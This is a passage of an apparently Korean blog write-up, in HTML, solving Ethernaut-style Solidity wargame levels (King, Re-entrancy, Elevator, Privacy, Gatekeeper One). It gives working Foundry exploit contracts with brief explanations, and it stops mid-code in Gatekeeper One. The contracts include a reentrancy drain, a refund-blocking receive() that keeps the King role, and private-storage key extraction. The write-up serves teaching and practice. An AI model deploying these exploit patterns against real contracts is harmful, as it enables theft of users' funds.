    <span class="k">let</span> <span class="n">receipt</span> <span class="o">=</span> <span class="n">web3</span><span class="nf">.eth</span><span class="p">()</span><span class="nf">.transaction_receipt</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
    <span class="k">if</span> <span class="n">receipt</span><span class="nf">.is_none</span><span class="p">()</span> <span class="p">{</span>
        <span class="nd">println!</span><span class="p">(</span><span class="s">"First transaction is not mined yet."</span><span class="p">);</span>
        <span class="k">return</span> <span class="nf">Ok</span><span class="p">(());</span>
    <span class="p">}</span>
    <span class="nf">Ok</span><span class="p">(())</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>비밀번호가 private 타입 변수에 저장되어 있는데 Solidity에서 private 뜻이 외부에서 읽을 수 없다는게 아니라 다른 컨트랙트에서의 접근을 제한하는 것이다.  블록체인에 배포된 모든 컨트랙트의 코드는 투명하게 공개되며 여기에 선언된 변수 및 함수 등이 모두 포함된다.</p>

<h2 id="king"><span class="me-2">King</span><a href="#king" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">King</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x07F63EB683304752A024500a9e541B905dF7d213</span><span class="p">;</span>
    <span class="c1">// address MY_ADDR = 0x8380390b25487B1Bb7C5D5C1709B96d5b8fBec2a</span>
    <span class="nx">King</span> <span class="kr">public</span> <span class="nx">king</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">king</span> <span class="o">=</span> <span class="nc">King</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">current owner, before ex: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">king</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">current prize : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">king</span><span class="p">.</span><span class="nf">prize</span><span class="p">());</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">CHALLENGE_ADDR</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="nx">king</span><span class="p">.</span><span class="nf">prize</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">current owner, after ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">king</span><span class="p">.</span><span class="nf">owner</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">CHALLENGE_ADDR</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="nx">king</span><span class="p">.</span><span class="nf">prize</span><span class="p">()</span> <span class="o">+</span> <span class="mi">5</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.004</span> <span class="nx">ether</span><span class="p">}();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>King 컨트랙트에 입금을 할 때마다, 입금한 금액이 현재 prize 금액과 같거나 크면 King을 탈취할 수 있다. 하지만 Submit Instance 기능을 클릭할 경우는 msg.sender가 owner이기 때문에 또 다시 King 자리를 뺏앗기게 된다. 그러나 여기서 King 자리를 탈취하기 전에 이전 King의 자금을 돌려주고 있기 때문에 공격용 컨트랙트 내에 <code class="language-plaintext highlighter-rouge">receive()</code> 함수로 누군가 King 자리를 가져가려 할 때 바로 재 입금하게 만들어주면 항상 King을 유지할 수 있다.</p>

<h2 id="re-entrancy"><span class="me-2">Re-entrancy</span><a href="#re-entrancy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Reentrance</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x8aCd85898458400f7Db866d53FCFF6f0D49741FF</span><span class="p">;</span>

    <span class="nx">Reentrance</span> <span class="kr">public</span> <span class="nx">ree</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">ree</span> <span class="o">=</span> <span class="nc">Reentrance</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of chall, before ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">ree</span><span class="p">.</span><span class="nx">donate</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.001</span> <span class="nx">ether</span><span class="p">}(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of player, before player : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">ree</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">ree</span><span class="p">.</span><span class="nf">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of chall, aftert ex : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Balance of player, after player : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">ree</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
    <span class="p">}</span>

    <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">ree</span><span class="p">.</span><span class="nf">withdraw</span><span class="p">(</span><span class="mf">0.001</span> <span class="nx">ether</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Exploit</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Exploit</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exploit</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mf">0.005</span> <span class="nx">ether</span><span class="p">}();</span>
        <span class="c1">//exploit = new Exploit();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">withdraw()</code> 함수 내에서 자금을 인출한 이후에 전산을 처리하고 있기 때문에 재진입 공격이 발생한다.</p>

<h2 id="elevator"><span class="me-2">Elevator</span><a href="#elevator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Elevator</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Building</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x8e80FFe6Dc044F4A766Afd6e5a8732Fe0977A493</span><span class="p">;</span>
    <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">checked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nx">Elevator</span> <span class="kr">public</span> <span class="nx">elevator</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">elevator</span> <span class="o">=</span> <span class="nc">Elevator</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">isLastFloor</span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Called</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">checked : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">checked</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">checked</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">checked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">elevator</span><span class="p">.</span><span class="nf">goTo</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>

<span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Test</span><span class="p">,</span> <span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Building</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../script/exploit.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Solve</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>
    <span class="nx">Building</span> <span class="kr">public</span> <span class="nx">exploit</span><span class="p">;</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
        <span class="c1">//exploit = new Exploit{value: 0.005 ether}();</span>
        <span class="nx">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Building</span><span class="p">();</span>
        <span class="nx">exploit</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// test/Solve.sol</span>
</pre></td></tr></tbody></table></code></div></div>
<p>Building 컨트랙트를 캐스팅할 때, msg.sender로 해주고 있기 때문에 공격용 컨트랙트내에 <code class="language-plaintext highlighter-rouge">isLastFloor()</code> 함수를 임의로 구현해줄 수 있다.</p>

<h2 id="privacy"><span class="me-2">Privacy</span><a href="#privacy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fc4faffcc-db47-4828-b1de-343449c93df7%2Fimage.png/size/w=2000?exp=1737102934&amp;sig=pEk6mhgEavPLR_XUK9vKSVC_HCCmwQmxswb391Sac-0" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2Fc4faffcc-db47-4828-b1de-343449c93df7%2Fimage.png/size/w=2000?exp=1737102934&amp;sig=pEk6mhgEavPLR_XUK9vKSVC_HCCmwQmxswb391Sac-0" alt="" loading="lazy"></a></p>

<p>EVM의 Storae 슬롯 크기는 32 바이트이다. 또한 슬롯 최적화를 위해서 슬롯을 같이 사용하게 되는 경우도 있다. Storage를 확인해 보면 flattening, denomination, awkwardness 변수는 2번 슬롯을 같이 사용하고 data 변수는 3번 슬롯을 사용하는 것을 확인할 수 있다.  여기서 locked 변수는 32 바이트가 아닌데 단독으로 1번 슬롯을 사용하고 있는데, 컨트랙트를 배포해서 확인해 보니 다음 데이터가 32 바이트 이기 때문에 슬롯을 최적화를  위해서 단독으로 사용하고 있는 것을 확인할 수 있었다. locked 다음에 uint16 타입의 변수를 넣고 확인하니 예상대로 함께 사용하고 있는 것을 볼 수 있다. 그리고 data 같은 경우에는 고정 크기 배열로 정의되어 있기 때문에 데이터가 3, 4, 5 슬롯에 각 각 들어간다.</p>

<p>반대로 배열이 동적으로 길이가 생성된다면 슬롯 내에는 배열의 길이가 저장된다. 그래서 <code class="language-plaintext highlighter-rouge">uint256(keccak256(abi.encode(slot)))</code>으로 위치를 구할 수 있다.</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Privacy</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Express</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0xde46dABb403Afc77DD67B6C69Bbd44B9347AE0e7</span><span class="p">;</span>
    <span class="nx">Privacy</span> <span class="kr">public</span> <span class="nx">privacy</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">privacy</span> <span class="o">=</span> <span class="nc">Privacy</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">bytes16</span> <span class="nx">key</span> <span class="o">=</span> <span class="nf">bytes16</span><span class="p">(</span><span class="nf">bytes32</span><span class="p">(</span><span class="mh">0x7c4132911140941f6873d6de6aaf49338f9d8e96290e457f8e061096f66518fe</span><span class="p">));</span>
        <span class="nx">privacy</span><span class="p">.</span><span class="nf">unlock</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// script/exploit.sol</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="gatekeeper-one"><span class="me-2">Gatekeeper One</span><a href="#gatekeeper-one" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>첫 번째 조건은 <code class="language-plaintext highlighter-rouge">msg.sender</code>와 <code class="language-plaintext highlighter-rouge">tx.origin</code>이 다르면 되는데 이는 eoa → ca → ca로 맞춰주면 되고, 두 번째 조건은 <code class="language-plaintext highlighter-rouge">gasleft()</code>의 값이 8191의 배수여야 한다.</p>

<p><a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F3e8aa16c-020e-4e26-93f6-88222cb34676%2Fimage.png/size/w=2000?exp=1737103070&amp;sig=7EXTdCaibymBtht2lQOeuFjTyNgpVgox8o7Vcs0_0Fs" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F3e8aa16c-020e-4e26-93f6-88222cb34676%2Fimage.png/size/w=2000?exp=1737103070&amp;sig=7EXTdCaibymBtht2lQOeuFjTyNgpVgox8o7Vcs0_0Fs" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">gateOne()</code> 이후에 <code class="language-plaintext highlighter-rouge">gateTwo()</code>에서 조건이 안 맞아 revert나는 곳까지 사용되는 가스를 보면 위와 같이 344로 나오는 것을 확인할 수 있었다.  다른 환경에서는 344보다 조금 차이가 있을 수 있기 때문에 300 좀 넘는 숫자까지 for 문 돌려주면 된다.</p>

<p><a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F2399bb0d-3630-4bca-a722-bed4d2463072%2Fimage.png/size/w=2000?exp=1737112914&amp;sig=BAIHX6S0fMfG7IhcQBht-j60pWzYTUfTRcVuiAlzv_s" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F2399bb0d-3630-4bca-a722-bed4d2463072%2Fimage.png/size/w=2000?exp=1737112914&amp;sig=BAIHX6S0fMfG7IhcQBht-j60pWzYTUfTRcVuiAlzv_s" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">gateThree()</code>에서 첫 번째 조건은 키를 32 비트로 변환한 값과 16비트로 변환한 값이 같아야 하고,  두 번째 조건은 32비트로 변환한 값과 64비트의 값은 달라야 하며, 세 번째 조건은 키를 32비트로 변환한 값과 tx.origin을 16비트로 변환한 값과 같아야 한다.</p>

<p>키가 0x1234567890ABCDEF일 때, uint64는 그대로이고, uint32는 상위 4바이트가 잘렸고, uint16은 상위 6 바이트가 잘린 것을 확인할 수 있다.  여기서 32 비트와 12비트 값을 동일하게 만들기 위해서 32비트의 값이 0x0000cdef가 돼야 하기 때문에 키 값은 0x123456780000CDEF가 된다.
<a href="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F77d8a484-a540-4fe0-914f-3a83bf2dd535%2Fimage.png/size/w=2000?exp=1737112944&amp;sig=kLQZhcz79_njs6JlnacZGQIPtZhLAfnOlsvllEbk-N8" class="popup img-link  shimmer"><img src="https://img.notionusercontent.com/s3/prod-files-secure%2F9a5130d6-cf56-4bd9-8e9b-4ac666fd88f6%2F77d8a484-a540-4fe0-914f-3a83bf2dd535%2Fimage.png/size/w=2000?exp=1737112944&amp;sig=kLQZhcz79_njs6JlnacZGQIPtZhLAfnOlsvllEbk-N8" alt="" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">tx.origin</code>을 16 비트로 변환한 값을 보면 0x919c이기 때문에 위에서 분석한 대로 조건을 맞추 주기 위해서 0x123456780000919c를 키로 사용하면 된다 (풀이자의 주소마다 값은 달라진다).</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">,</span> <span class="nx">console2</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">GatekeeperOne</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Exploit</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="nx">CHALLENGE_ADDR</span> <span class="o">=</span> <span class="mh">0x7f798a5B3FFAD0BE8Bf1F1Dd79fFAF94213993ce</span><span class="p">;</span>
    <span class="nx">GatekeeperOne</span> <span class="kr">public</span> <span class="nx">gatekeeperOne</span><span class="p">;</span>

    <span class="nf">constructor</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">gatekeeperOne</span> <span class="o">=</span> <span class="nc">GatekeeperOne</span><span class="p">(</span><span class="nx">CHALLENGE_ADDR</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">console2</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">entrant : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">gatekeeperOne</span><span class="p">.</span><span class="nf">entrant</span><span class="p">());</span>
        <span class="k">for</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">400</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">bytes8</span> <span class="nx">_gateKey</span> <span class="o">=</span> <span class="mh">0x123456780000919c</span><span class="p">;</span>

            <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">gatekeeperOne</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">gas</span><span class="p">:</span> <span class="nx">i</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8191</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)}(</span>
